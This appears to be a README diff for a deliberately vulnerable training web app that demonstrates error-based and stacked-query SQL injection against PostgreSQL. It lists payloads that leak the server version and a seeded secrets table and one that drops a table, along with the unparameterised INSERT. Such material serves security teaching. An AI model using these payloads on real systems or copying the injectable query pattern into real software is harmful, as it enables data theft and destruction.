@@ -7,9 +7,7 @@ An **intentionally vulnerable** demo web application that showcases
 
 ## What it does
 
-A simple form with three fields (`username`, `email`, `comment`) and a
-"Create record" button. Submitting the form calls `POST /api/records`,
-which executes:
+The app exposes two labs, both backed by the same vulnerable INSERT:
 
 ```sql
 INSERT INTO records (username, email, comment)
@@ -18,13 +16,23 @@ RETURNING ...;
 ```
 
 All three values are concatenated directly into the SQL string with no
-escaping or parameter binding, so **every field is a SQL injection
-sink**. The `comment` field is the canonical demo target because it is
-the last value in the INSERT (no trailing single-quote / closing paren
-to balance), but `username` and `email` are equally exploitable. When
-the resulting SQL is syntactically broken, the PostgreSQL error message
-is returned to the browser and rendered in the result panel — that is
-the visible error oracle for error-based SQLi.
+escaping or parameter binding, so every field is a SQL injection sink.
+
+- **Lab 1 — Error-based** (`POST /api/records`). The endpoint returns
+  only the *last* result set from `pool.query`, so injection has to
+  leak data through PostgreSQL error messages (cast errors, etc.). The
+  syntactically-broken SQL is rendered into the result panel — that's
+  the visible error oracle.
+- **Lab 2 — Stacked-query data leak** (`POST /api/lab2/records`). Same
+  vulnerable INSERT, but the response includes *every* result set the
+  simple-query protocol returns. Stacked queries leak data directly:
+  `'); SELECT version() --` produces a second result set whose rows
+  contain the server version.
+
+A "Verbose error responses" toggle at the top of the page controls
+whether DB errors come back as the full Postgres JSON
+(`error`/`detail`/`position`/`executedSql`) or just a generic 500 with
+`ERROR: <message>`.
 
 ## Run it
 
@@ -47,27 +55,33 @@ PGUSER=postgres PGPASSWORD=postgres PGDATABASE=vulnerable_app npm start
 
 ## Try the injection
 
-All three fields are vulnerable. A few payloads to try:
+All three fields are vulnerable in both labs.
 
-- Break the syntax (any field) to trigger an error:
-  - value: `'`  →  PostgreSQL responds with `unterminated quoted string ...`.
-- Comment-out the rest of the statement (`username` or `email`):
-  - `username`: `x', '', '') --`  →  closes the INSERT and ignores the rest.
-- Cast-error oracle to leak data via a type error (any field):
-  - `comment`:
-    ```
-    ') , (CAST((SELECT value FROM secrets WHERE name='flag') AS int), '', '
-    ```
-    (Adjust to fit; the point is to leak `secrets.value` inside an error
-    message such as `invalid input syntax for type integer: "CTF{...}"`.)
+### Lab 1 — Error-based payloads
+- Break the syntax: value `'` → `unterminated quoted string ...`.
+- Comment out the rest: `username = x', '', '') --` → INSERT closed.
+- Cast-error data leak (`comment`):
+  ```
+  ') , ('x', 'y', (SELECT CAST(version() AS int))) --
+  ```
+  → `invalid input syntax for type integer: "PostgreSQL 16..."`.
+- Leak the seeded flag (`comment`):
+  ```
+  ') , ('x', 'y', (SELECT CAST(value AS int) FROM secrets WHERE name='flag')) --
+  ```
 
-The error JSON returned by the server includes `error`, `detail`,
-`position`, and the `executedSql` so you can see exactly what was sent
-to the database.
+### Lab 2 — Stacked-query payloads
+- Server version (`comment`): `'); SELECT version() --`
+- Read the secrets table (`comment`): `'); SELECT name, value FROM secrets --`
+- Run a destructive statement (any field): `'); DROP TABLE secrets --` (don't do this on data you care about).
+
+In Lab 2 the response body contains a `resultSets` array with one
+entry per executed statement; the leaked rows show up there directly
+without needing an error message.
 
 ## Files
 
-- `server.js` — Express backend. Vulnerable endpoint: `POST /api/records`.
-- `public/index.html` — Frontend form and error renderer.
+- `server.js` — Express backend. Vulnerable endpoints: `POST /api/records` (Lab 1, single result set) and `POST /api/lab2/records` (Lab 2, all result sets). Settings: `GET/POST /api/settings`.
+- `public/index.html` — Tabbed frontend with both labs and the verbose-errors toggle.
 - `db/init.sql` — Schema + a `secrets` table to make exfiltration demos meaningful.
 - `docker-compose.yml` — Postgres 16 + Node 20 dev stack.
